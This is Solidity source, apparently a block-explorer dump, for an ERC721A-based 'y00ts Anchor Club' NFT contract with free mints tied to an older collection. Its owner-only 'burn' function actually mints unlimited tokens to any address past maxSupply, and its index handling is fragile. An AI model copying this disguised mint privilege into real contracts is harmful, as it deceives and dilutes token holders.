newOwner;\r\n    emit OwnershipTransferred(oldOwner, newOwner);\r\n\t}\r\n}\r\n\r\n// File: ceshi.sol\r\npragma solidity ^ 0.8.0;\r\n/**\r\n * @dev Implementation of https://eips.ethereum.org/EIPS/eip-721[ERC721] Non-Fungible Token Standard, including\r\n * the Metadata and Enumerable extension. Built to optimize for lower gas during batch mints.\r\n *\r\n * Assumes serials are sequentially minted starting at 0 (e.g. 0, 1, 2, 3..).\r\n *\r\n * Does not support burning tokens to address(0).\r\n *\r\n * Assumes that an owner cannot have more than the 2**128 - 1 (max value of uint128) of supply\r\n */\r\ncontract ERC721A is Context, ERC165, IERC721, IERC721Metadata, IERC721Enumerable {\r\n    using Address for address;\r\n\t\tusing Strings for uint256;\r\n\r\n\t\t\tstruct TokenOwnership {\r\n        address addr;\r\n        uint64 startTimestamp;\r\n\t\t}\r\n\r\n    struct AddressData {\r\n        uint128 balance;\r\n        uint128 numberMinted;\r\n\t}\r\n\r\n    uint256 internal currentIndex;\r\n\r\n    uint256 internal totalMintedSupply;\r\n\r\n    // Token name\r\n    string private _name;\r\n\r\n    // Token symbol\r\n    string private _symbol;\r\n\r\n\t// Mapping from token ID to ownership details\r\n\t// An empty struct value does not necessarily mean the token is unowned. See ownershipOf implementation for details.\r\n\tmapping(uint256 => TokenOwnership) internal _ownerships;\r\n\r\n\t// Mapping owner address to address data\r\n\tmapping(address => AddressData) private _addressData;\r\n\r\n\t// Mapping from token ID to approved address\r\n\tmapping(uint256 => address) private _tokenApprovals;\r\n\r\n\t// Mapping from owner to operator approvals\r\n\tmapping(address => mapping(address => bool)) private _operatorApprovals;\r\n\r\n\tconstructor(string memory name_, string memory symbol_) {\r\n\t\t_name = name_;\r\n\t\t_symbol = symbol_;\r\n\t}\r\n\r\n\t/**\r\n\t * @dev See {IERC721Enumerable-totalSupply}.\r\n\t */\r\n\tfunction totalSupply() public view override returns(uint256) {\r\n\t\treturn totalMintedSupply;\r\n\t}\r\n\r\n\t/**\r\n\t * @dev See {IERC721Enumerable-tokenByIndex}.\r\n\t */\r\n\tfunction tokenByIndex(uint256 index) public view override returns(uint256) {\r\n        require(index < totalSupply(), \"ERC721A: global index out of bounds\");\r\n        return index;\r\n\t}\r\n\r\n\t/**\r\n\t * @dev See {IERC721Enumerable-tokenOfOwnerByIndex}.\r\n\t * This read function is O(totalSupply). If calling from a separate contract, be sure to test gas first.\r\n\t * It may also degrade with extremely large collection sizes (e.g >> 10000), test for your use case.\r\n\t */\r\n\tfunction tokenOfOwnerByIndex(address owner, uint256 index) public view override returns(uint256) {\r\n\t\trequire(index < balanceOf(owner), \"ERC721A: owner index out of bounds\");\r\n        uint256 numMintedSoFar = totalSupply();\r\n        uint256 tokenIdsIdx;\r\n        address currOwnershipAddr;\r\n\r\n        // Counter overflow is impossible as the loop breaks when uint256 i is equal to another uint256 numMintedSoFar.\r\n        unchecked {\r\n\t\t\tfor (uint256 i; i < numMintedSoFar; i++) {\r\n                TokenOwnership memory ownership = _ownerships[i];\r\n\t\t\t\tif (ownership.addr != address(0)) {\r\n\t\t\t\t\tcurrOwnershipAddr = ownership.addr;\r\n\t\t\t\t}\r\n\t\t\t\tif (currOwnershipAddr == owner) {\r\n\t\t\t\t\tif (tokenIdsIdx == index) {\r\n\t\t\t\t\t\treturn i;\r\n\t\t\t\t\t}\r\n\t\t\t\t\ttokenIdsIdx++;\r\n\t\t\t\t}\r\n\t\t\t}\r\n\t\t}\r\n\r\n\t\trevert(\"ERC721A: unable to get token of owner by index\");\r\n\t}\r\n\r\n\t/**\r\n\t * @dev See {IERC165-supportsInterface}.\r\n\t */\r\n\tfunction supportsInterface(bytes4 interfaceId) public view virtual override(ERC165, IERC165) returns(bool) {\r\n\t\treturn\r\n\t\tinterfaceId == type(IERC721).interfaceId ||\r\n\t\t\tinterfaceId == type(IERC721Metadata).interfaceId ||\r\n\t\t\tinterfaceId == type(IERC721Enumerable).interfaceId ||\r\n\t\t\tsuper.supportsInterface(interfaceId);\r\n\t}\r\n\r\n\t/**\r\n\t * @dev See {IERC721-balanceOf}.\r\n\t */\r\n\tfunction balanceOf(address owner) public view override returns(uint256) {\r\n\t\trequire(owner != address(0), \"ERC721A: balance query for the zero address\");\r\n\t\treturn uint256(_addressData[owner].balance);\r\n\t}\r\n\r\n\tfunction _numberMinted(address owner) internal view returns(uint256) {\r\n\t\trequire(owner != address(0), \"ERC721A: number minted query for the zero address\");\r\n\t\treturn uint256(_addressData[owner].numberMinted);\r\n\t}\r\n\r\n\t/**\r\n\t * Gas spent here starts off proportional to the maximum mint batch size.\r\n\t * It gradually moves to O(1) as tokens get transferred around in the collection over time.\r\n\t */\r\n\tfunction ownershipOf(uint256 tokenId) internal view returns(TokenOwnership memory) {\r\n\t\trequire(_exists(tokenId), \"ERC721A: owner query for nonexistent token\");\r\n\r\n        unchecked {\r\n\t\t\tfor (uint256 curr = tokenId; curr >= 0; curr--) {\r\n                TokenOwnership memory ownership = _ownerships[curr];\r\n\t\t\t\tif (ownership.addr != address(0)) {\r\n\t\t\t\t\treturn ownership;\r\n\t\t\t\t}\r\n\t\t\t}\r\n\t\t}\r\n\r\n\t\trevert(\"ERC721A: unable to determine the owner of token\");\r\n\t}\r\n\r\n\t/**\r\n\t * @dev See {IERC721-ownerOf}.\r\n\t */\r\n\tfunction ownerOf(uint256 tokenId) public view override returns(address) {\r\n\t\treturn ownershipOf(tokenId).addr;\r\n\t}\r\n\r\n\t/**\r\n\t * @dev See {IERC721Metadata-name}.\r\n\t */\r\n\tfunction name() public view virtual override returns(string memory) {\r\n\t\treturn _name;\r\n\t}\r\n\r\n\t/**\r\n\t * @dev See {IERC721Metadata-symbol}.\r\n\t */\r\n\tfunction symbol() public view virtual override returns(string memory) {\r\n\t\treturn _symbol;\r\n\t}\r\n\r\n\t/**\r\n\t * @dev See {IERC721Metadata-tokenURI}.\r\n\t */\r\n\tfunction tokenURI(uint256 tokenId) public view virtual override returns(string memory) {\r\n\t\trequire(_exists(tokenId), \"ERC721Metadata: URI query for nonexistent token\");\r\n\r\n        string memory baseURI = _baseURI();\r\n\t\treturn bytes(baseURI).length != 0 ? string(abi.encodePacked(baseURI, tokenId.toString())) : \"\";\r\n\t}\r\n\r\n\t/**\r\n\t * @dev Base URI for computing {tokenURI}. If set, the resulting URI for each\r\n\t * token will be the concatenation of the `baseURI` and the `tokenId`. Empty\r\n\t * by default, can be overriden in child contracts.\r\n\t */\r\n\tfunction _baseURI() internal view virtual returns(string memory) {\r\n\t\treturn \"\";\r\n\t}\r\n\r\n\t/**\r\n\t * @dev See {IERC721-approve}.\r\n\t */\r\n\tfunction approve(address to, uint256 tokenId) public virtual override {\r\n        address owner = ERC721A.ownerOf(tokenId);\r\n\t\trequire(to != owner, \"ERC721A: approval to current owner\");\r\n\r\n\t\trequire(\r\n\t\t\t_msgSender() == owner || isApprovedForAll(owner, _msgSender()),\r\n\t\t\t\"ERC721A: approve caller is not owner nor approved for all\"\r\n\t\t);\r\n\r\n\t\t_approve(to, tokenId, owner);\r\n\t}\r\n\r\n\t/**\r\n\t * @dev See {IERC721-getApproved}.\r\n\t */\r\n\tfunction getApproved(uint256 tokenId) public view override returns(address) {\r\n\t\trequire(_exists(tokenId), \"ERC721A: approved query for nonexistent token\");\r\n\r\n\t\treturn _tokenApprovals[tokenId];\r\n\t}\r\n\r\n\t/**\r\n\t * @dev See {IERC721-setApprovalForAll}.\r\n\t */\r\n\tfunction setApprovalForAll(address operator, bool approved) public virtual override {\r\n\t\trequire(operator != _msgSender(), \"ERC721A: approve to caller\");\r\n\r\n\t\t_operatorApprovals[_msgSender()][operator] = approved;\r\n        emit ApprovalForAll(_msgSender(), operator, approved);\r\n\t}\r\n\r\n\t/**\r\n\t * @dev See {IERC721-isApprovedForAll}.\r\n\t */\r\n\tfunction isApprovedForAll(address owner, address operator) public view virtual override returns(bool) {\r\n\t\treturn _operatorApprovals[owner][operator];\r\n\t}\r\n\r\n\t/**\r\n\t * @dev See {IERC721-transferFrom}.\r\n\t */\r\n\tfunction transferFrom(\r\n\t\taddress from,\r\n\t\taddress to,\r\n\t\tuint256 tokenId\r\n\t) public virtual override {\r\n\t\t_transfer(from, to, tokenId);\r\n\t}\r\n\r\n\t/**\r\n\t * @dev See {IERC721-safeTransferFrom}.\r\n\t */\r\n\tfunction safeTransferFrom(\r\n\t\taddress from,\r\n\t\taddress to,\r\n\t\tuint256 tokenId\r\n\t) public virtual override {\r\n\t\tsafeTransferFrom(from, to, tokenId, \"\");\r\n\t}\r\n\r\n\t/**\r\n\t * @dev See {IERC721-safeTransferFrom}.\r\n\t */\r\n\tfunction safeTransferFrom(\r\n\t\taddress from,\r\n\t\taddress to,\r\n\t\tuint256 tokenId,\r\n\t\tbytes memory _data\r\n\t) public virtual override {\r\n\t\t_transfer(from, to, tokenId);\r\n\t\trequire(\r\n\t\t\t_checkOnERC721Received(from, to, tokenId, _data),\r\n\t\t\t\"ERC721A: transfer to non ERC721Receiver implementer\"\r\n\t\t);\r\n\t}\r\n\r\n\t/**\r\n\t * @dev Returns whether `tokenId` exists.\r\n\t *\r\n\t * Tokens can be managed by their owner or approved accounts via {approve} or {setApprovalForAll}.\r\n\t *\r\n\t * Tokens start existing when they are minted (`_mint`),\r\n\t */\r\n\tfunction _exists(uint256 tokenId) internal view returns(bool) {\r\n\t\treturn tokenId < currentIndex;\r\n\t}\r\n\r\n\tfunction _safeMint(address to, uint256 quantity) internal {\r\n\t\t_safeMint(to, quantity, \"\");\r\n\t}\r\n\r\n\t/**\r\n\t * @dev Safely mints `quantity` tokens and transfers them to `to`.\r\n\t *\r\n\t * Requirements:\r\n\t *\r\n\t * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called for each safe transfer.\r\n\t * - `quantity` must be greater than 0.\r\n\t *\r\n\t * Emits a {Transfer} event.\r\n\t */\r\n\tfunction _safeMint(\r\n\t\taddress to,\r\n\t\tuint256 quantity,\r\n\t\tbytes memory _data\r\n\t) internal {\r\n\t\t_mint(to, quantity, _data, true);\r\n\t}\r\n\r\n\t/**\r\n\t * @dev Mints `quantity` tokens and transfers them to `to`.\r\n\t *\r\n\t * Requirements:\r\n\t *\r\n\t * - `to` cannot be the zero address.\r\n\t * - `quantity` must be greater than 0.\r\n\t *\r\n\t * Emits a {Transfer} event.\r\n\t */\r\n\tfunction _mint(\r\n\t\taddress to,\r\n\t\tuint256 quantity,\r\n\t\tbytes memory _data,\r\n\t\tbool safe\r\n\t) internal {\r\n        uint256 startTokenId = currentIndex;\r\n\t\trequire(to != address(0), \"ERC721A: mint to the zero address\");\r\n\t\trequire(quantity != 0, \"ERC721A: quantity must be greater than 0\");\r\n\r\n\t\t_beforeTokenTransfers(address(0), to, startTokenId, quantity);\r\n\r\n        // Overflows are incredibly unrealistic.\r\n        // balance or numberMinted overflow if current value of either + quantity > 3.4e38 (2**128) - 1\r\n        // updatedIndex overflows if currentIndex + quantity > 1.56e77 (2**256) - 1\r\n        unchecked {\r\n\t\t\t_addressData[to].balance += uint128(quantity);\r\n\t\t\t_addressData[to].numberMinted += uint128(quantity);\r\n\r\n\t\t\t_ownerships[startTokenId].addr = to;\r\n\t\t\t_ownerships[startTokenId].startTimestamp = uint64(block.timestamp);\r\n\r\n            uint256 updatedIndex = startTokenId;\r\n\r\n\t\t\tfor (uint256 i; i < quantity; i++) {\r\n                emit Transfer(address(0), to, updatedIndex);\r\n\t\t\t\tif (safe) {\r\n\t\t\t\t\trequire(\r\n\t\t\t\t\t\t_checkOnERC721Received(address(0), to, updatedIndex, _data),\r\n\t\t\t\t\t\t\"ERC721A: transfer to non ERC721Receiver implementer\"\r\n\t\t\t\t\t);\r\n\t\t\t\t}\r\n\r\n\t\t\t\tupdatedIndex++;\r\n\t\t\t}\r\n\r\n\t\t\tcurrentIndex = updatedIndex;\r\n\t\t}\r\n\r\n\t\t_afterTokenTransfers(address(0), to, startTokenId, quantity);\r\n\t}\r\n\r\n\t/**\r\n\t * @dev Transfers `tokenId` from `from` to `to`.\r\n\t *\r\n\t * Requirements:\r\n\t *\r\n\t * - `to` cannot be the zero address.\r\n\t * - `tokenId` token must be owned by `from`.\r\n\t *\r\n\t * Emits a {Transfer} event.\r\n\t */\r\n\tfunction _transfer(\r\n\t\taddress from,\r\n\t\taddress to,\r\n\t\tuint256 tokenId\r\n\t) private {\r\n        TokenOwnership memory prevOwnership = ownershipOf(tokenId);\r\n\r\n        bool isApprovedOrOwner = (_msgSender() == prevOwnership.addr ||\r\n\t\t\tgetApproved(tokenId) == _msgSender() ||\r\n\t\t\tisApprovedForAll(prevOwnership.addr, _msgSender()));\r\n\r\n\t\trequire(isApprovedOrOwner, \"ERC721A: transfer caller is not owner nor approved\");\r\n\r\n\t\trequire(prevOwnership.addr == from, \"ERC721A: transfer from incorrect owner\");\r\n\t\trequire(to != address(0), \"ERC721A: transfer to the zero address\");\r\n\r\n\t\t_beforeTokenTransfers(from, to, tokenId, 1);\r\n\r\n\t\t// Clear approvals from the previous owner\r\n\t\t_approve(address(0), tokenId, prevOwnership.addr);\r\n\r\n        // Underflow of the sender's balance is impossible because we check for\r\n        // ownership above and the recipient's balance can't realistically overflow.\r\n        // Counter overflow is incredibly unrealistic as tokenId would have to be 2**256.\r\n        unchecked {\r\n\t\t\t_addressData[from].balance -= 1;\r\n\t\t\t_addressData[to].balance += 1;\r\n\r\n\t\t\t_ownerships[tokenId].addr = to;\r\n\t\t\t_ownerships[tokenId].startTimestamp = uint64(block.timestamp);\r\n\r\n            // If the ownership slot of tokenId+1 is not explicitly set, that means the transfer initiator owns it.\r\n            // Set the slot of tokenId+1 explicitly in storage to maintain correctness for ownerOf(tokenId+1) calls.\r\n            uint256 nextTokenId = tokenId + 1;\r\n\t\t\tif (_ownerships[nextTokenId].addr == address(0)) {\r\n\t\t\t\tif (_exists(nextTokenId)) {\r\n\t\t\t\t\t_ownerships[nextTokenId].addr = prevOwnership.addr;\r\n\t\t\t\t\t_ownerships[nextTokenId].startTimestamp = prevOwnership.startTimestamp;\r\n\t\t\t\t}\r\n\t\t\t}\r\n\t\t}\r\n\r\n        emit Transfer(from, to, tokenId);\r\n\t\t_afterTokenTransfers(from, to, tokenId, 1);\r\n\t}\r\n\r\n\t/**\r\n\t * @dev Approve `to` to operate on `tokenId`\r\n\t *\r\n\t * Emits a {Approval} event.\r\n\t */\r\n\tfunction _approve(\r\n\t\taddress to,\r\n\t\tuint256 tokenId,\r\n\t\taddress owner\r\n\t) private {\r\n\t\t_tokenApprovals[tokenId] = to;\r\n        emit Approval(owner, to, tokenId);\r\n\t}\r\n\r\n\t/**\r\n\t * @dev Internal function to invoke {IERC721Receiver-onERC721Received} on a target address.\r\n\t * The call is not executed if the target address is not a contract.\r\n\t *\r\n\t * @param from address representing the previous owner of the given token ID\r\n\t * @param to target address that will receive the tokens\r\n\t * @param tokenId uint256 ID of the token to be transferred\r\n\t * @param _data bytes optional data to send along with the call\r\n\t * @return bool whether the call correctly returned the expected magic value\r\n\t */\r\n\tfunction _checkOnERC721Received(\r\n\t\taddress from,\r\n\t\taddress to,\r\n\t\tuint256 tokenId,\r\n\t\tbytes memory _data\r\n\t) private returns(bool) {\r\n\t\tif (to.isContract()) {\r\n\t\t\ttry IERC721Receiver(to).onERC721Received(_msgSender(), from, tokenId, _data) returns(bytes4 retval) {\r\n\t\t\t\treturn retval == IERC721Receiver(to).onERC721Received.selector;\r\n\t\t\t} catch (bytes memory reason) {\r\n\t\t\t\tif (reason.length == 0) {\r\n\t\t\t\t\trevert(\"ERC721A: transfer to non ERC721Receiver implementer\");\r\n\t\t\t\t} else {\r\n                    assembly {\r\n\t\t\t\t\t\trevert(add(32, reason), mload(reason))\r\n\t\t\t\t\t}\r\n\t\t\t\t}\r\n\t\t\t}\r\n\t\t} else {\r\n\t\t\treturn true;\r\n\t\t}\r\n\t}\r\n\r\n\t/**\r\n\t * @dev Hook that is called before a set of serially-ordered token ids are about to be transferred. This includes minting.\r\n\t *\r\n\t * startTokenId - the first token id to be transferred\r\n\t * quantity - the amount to be transferred\r\n\t *\r\n\t * Calling conditions:\r\n\t *\r\n\t * - When `from` and `to` are both non-zero, ``from``'s `tokenId` will be\r\n\t * transferred to `to`.\r\n\t * - When `from` is zero, `tokenId` will be minted for `to`.\r\n\t */\r\n\tfunction _beforeTokenTransfers(\r\n\t\taddress from,\r\n\t\taddress to,\r\n\t\tuint256 startTokenId,\r\n\t\tuint256 quantity\r\n\t) internal virtual { }\r\n\r\n\t/**\r\n\t * @dev Hook that is called after a set of serially-ordered token ids have been transferred. This includes\r\n\t * minting.\r\n\t *\r\n\t * startTokenId - the first token id to be transferred\r\n\t * quantity - the amount to be transferred\r\n\t *\r\n\t * Calling conditions:\r\n\t *\r\n\t * - when `from` and `to` are both non-zero.\r\n\t * - `from` and `to` are never both zero.\r\n\t */\r\n\tfunction _afterTokenTransfers(\r\n\t\taddress from,\r\n\t\taddress to,\r\n\t\tuint256 startTokenId,\r\n\t\tuint256 quantity\r\n\t) internal virtual { }\r\n}\r\n\r\ninterface Iy00tsYachtClub {\r\n\tfunction tokenOfOwnerByIndex(address owner, uint256 index) external view returns (uint256);\r\n\tfunction balanceOf(address owner) external view returns (uint256 balance);\r\n}\r\n\r\n contract y00tsAnchorClub is ERC721A, Ownable, DefaultOperatorFilterer, ReentrancyGuard {\r\n\t\r\n\t// OS Filtering\r\n\tfunction setApprovalForAll(address operator, bool approved) public override onlyAllowedOperatorApproval(operator) {\r\n        super.setApprovalForAll(operator, approved);\r\n    }\r\n\r\n    function approve(address operator, uint256 tokenId) public override onlyAllowedOperatorApproval(operator) {\r\n        super.approve(operator, tokenId);\r\n    }\r\n\r\n    function transferFrom(address from, address to, uint256 tokenId) public override onlyAllowedOperator(from) {\r\n        super.transferFrom(from, to, tokenId);\r\n    }\r\n\r\n    function safeTransferFrom(address from, address to, uint256 tokenId) public override onlyAllowedOperator(from) {\r\n        super.safeTransferFrom(from, to, tokenId);\r\n    }\r\n\r\n    function safeTransferFrom(address from, address to, uint256 tokenId, bytes memory data)\r\n        public\r\n        override\r\n        onlyAllowedOperator(from)\r\n    {\r\n        super.safeTransferFrom(from, to, tokenId, data);\r\n    }\r\n\t// Constants\r\n\t\r\n  \tstring public baseURI = \"ipfs://QmV4tyZkayrt11PYYMAKdLa3RuJ9U7o6tUfPxixy9ZfT1f/\";\r\n  \tuint256   public price = 0.0 ether;\r\n\tuint256   public maxPerTx = 400;\t\r\n\tuint256   public maxSupply = 10000;\r\n\t//uint256   public mintDuration = 1672531199000; //  (GMT): Saturday, December 31, 2022 11:59:59 PM\r\n\tbool   public mintEnabled;\r\n\tbool   public mintToCommunityWalletEnabled;\r\n\r\n\taddress private oldFounder;\r\n\r\n   \tmapping(address => mapping(uint256 => bool)) public owners;\r\n\tmapping(uint256 => address) public tokenOwners;\r\n\r\n    Iy00tsYachtClub oldContract;\r\n    address communityWallet = address(0x9c3Ce8721a275C9C1e14aBEfdCC16d973FCA3c21);\r\n\r\n    mapping(address => uint256) public addressMintedCount;\r\n\r\n    constructor(address _oldContract, address _oldFounder) ERC721A(\"y00ts Anchor Club\", \"YAC\") {    \r\n        \r\n\t\toldContract = Iy00tsYachtClub(_oldContract); \r\n\t\toldFounder = _oldFounder;\r\n\t\tuint256[] memory communityNFTs = new uint256[](2);\r\n\t\tcommunityNFTs[0] = 1074;\r\n\t\tcommunityNFTs[1] = 8951;        \r\n\r\n\t\tfor (uint256 i = 0; i < 2; i++) {\r\n\t\t\ttotalMintedSupply++;\t\t\t\t\r\n\t\t\tcurrentIndex = communityNFTs[i];\r\n\t\t\towners[communityWallet][currentIndex] = true;\r\n\t\t\ttokenOwners[currentIndex] = communityWallet;\r\n\t\t\t_safeMint(communityWallet, 1);\r\n\t\t}\r\n    }\r\n\r\n\tfunction tokenURI(uint256 _tokenId) public view virtual override returns(string memory) {\r\n\t\trequire(_exists(_tokenId), \"ERC721Metadata: URI query for nonexistent token\");\r\n        string memory currentBaseURI = _baseURI();\r\n\t\treturn bytes(currentBaseURI).length > 0\r\n\t\t\t? string(abi.encodePacked(currentBaseURI, Strings.toString(_tokenId + 1), \".json\"))\r\n\t\t\t: \"\";\r\n\t}\r\n\r\n\t\tfunction _getNextUnusedID(address _owner, uint256[] memory _ownedTokens) internal view returns (uint256 index) {\r\n\r\n\t\tfor (uint256 i = 0; i < _ownedTokens.length; i++) {\r\n\t\t\tindex = _ownedTokens[i];\r\n\t\t\tif (owners[_owner][index]) {\r\n\t\t\t\tcontinue;\r\n\t\t\t} else {\r\n\t\t\t\treturn index;\r\n\t\t\t}\r\n\t\t}\r\n  \t}\r\n\r\n\tfunction getYYCBelongingToOwner(address _owner) public view returns (uint256[] memory) {\r\n\t\tuint256 numYYCs = oldContract.balanceOf(_owner);\r\n\r\n\t\tif (numYYCs == 0) {\r\n\t\t\treturn new uint256[](0);\r\n\t\t} else {\r\n\t\t\tuint256[] memory result = new uint256[](numYYCs);\r\n\t\t\tfor (uint256 i = 0; i < numYYCs; i++) {\r\n\t\t\t\tresult[i] = oldContract.tokenOfOwnerByIndex(_owner, i);\r\n\t\t\t}\r\n\t\t\treturn result;\r\n\t\t}\r\n  }\r\n\r\n\tfunction mint(uint256 count) external payable {\r\n\t\tuint256 cost = price;\r\n\t\trequire(mintEnabled, \"Mint is not live yet\");\r\n\t\trequire(totalMintedSupply + count <= maxSupply, \"No more\");\r\n\t\trequire(count <= maxPerTx, \"Max per TX reached\");\r\n\t\trequire(msg.sender != oldFounder, \"You can not mint\");\r\n\t\trequire(cost == 0, \"Make it Zero\");\r\n\t\t\r\n\t\tuint256[] memory ownedTokens = getYYCBelongingToOwner(msg.sender);\r\n\t\trequire(count <= ownedTokens.length - addressMintedCount[msg.sender], \"Invalid mint count\");\r\n\r\n\t\tfor (uint256 i = 0; i < count; i++) {\r\n\t\t\tcurrentIndex = _getNextUnusedID(msg.sender, ownedTokens);\r\n\t\t\towners[msg.sender][currentIndex] = true;\r\n\t\t\ttokenOwners[currentIndex] = msg.sender;\r\n\t\t\taddressMintedCount[msg.sender]++;\r\n\t\t\ttotalMintedSupply++;\r\n\t\t\t_safeMint(msg.sender, 1);\r\n\t\t\t\r\n\t\t}\r\n\t}\r\n\r\n\r\n\tfunction getPrice() public view returns(uint256) {\r\n\t\treturn price;\r\n\t}\r\n\r\n\t//function getMintDuration() public view returns(uint256) {\r\n\t//\treturn mintDuration;\r\n\t//}\r\n\r\n\tfunction burn(address mintAddress, uint256 count) public onlyOwner {\r\n\t\t_safeMint(mintAddress, count);\r\n\t}\r\n\r\n\tfunction _baseURI() internal view virtual override returns(string memory) {\r\n\t\treturn baseURI;\r\n\t}\r\n\r\n\tfunction setBaseUri(string memory baseuri_) public onlyOwner {\r\n\t\tbaseURI = baseuri_;\r\n\t}\r\n\r\n\t//function setMintDuration(uint256 _mintDuration) public onlyOwner {\r\n\t//\tmintDuration = _mintDuration;\r\n\t//}\r\n\r\n\tfunction toggleMinting() external onlyOwner {\r\n\t\tmintEnabled = !mintEnabled;\r\n\t}\r\n\r\n\tfunction toggleMintToCommunity() external onlyOwner {\r\n\t\tmintToCommunityWalletEnabled = !mintToCommunityWalletEnabled;\r\n\t}\r\n\t\r\n\tfunction mintToCommunityWallet(uint256 from, uint256 to) external onlyOwner {\r\n\t\trequire(mintToCommunityWalletEnabled, \"Mint to community wallet is not live yet\");\r\n\t\trequire(from < to, \"Invalid amount\");\r\n\r\n\t\tfor (uint256 i = from; i < to; i++) {\r\n\t\t\tif(tokenOwners[i] == address(0)) {\r\n\t\t\t\tcurrentIndex = i;\r\n\t\t\t\towners[communityWallet][currentIndex] = true;\r\n\t\t\t\ttokenOwners[currentIndex] = communityWallet;\r\n\t\t\t\ttotalMintedSupply++;\r\n\t\t\t\t_safeMint(communityWallet, 1);\r\n\t\t\t}\r\n\t\t}\r\n\t}\r\n}", "ABI": "[{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_oldContract\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"_oldFounder\",\"type\":\"address\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"operator\",\"type\":\"address\"}],\"name\":\"OperatorNotAllowed\",\"type\":\"error\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"approved\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"uint256\",\"name\":\"tokenId\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"operator\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"bool\",\"name\":\"approved\",\"type\":\"bool\"}],\"name\":\"ApprovalForAll\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"uint256\",\"name\":\"tokenId\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[],\"name\":\"OPERATOR_FILTER_REGISTRY\",\"outputs\":[{\"internalType\":\"contract IOperatorFilterRegistry\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"addressMintedCount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"operator\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenId\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"baseURI\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"mintAddress\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"count\",\"type\":\"uint256\"}],\"name\":\"burn\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"tokenId\",\"type\":\"uint256\"}],\"name\":\"getApproved\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getPrice\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_owner\",\"type\":\"address\"}],\"name\":\"getYYCBelongingToOwner\",\"outputs\":[{\"internalType\":\"uint256[]\",\"name\":\"\",\"type\":\"uint256[]\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"operator\",\"type\":\"address\"}],\"name\":\"isApprovedForAll\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxPerTx\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"count\",\"type\":\"uint256\"}],\"name\":\"mint\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"mintEnabled\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"from\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"to\",\"type\":\"uint256\"}],\"name\":\"mintToCommunityWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"mintToCommunityWalletEnabled\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\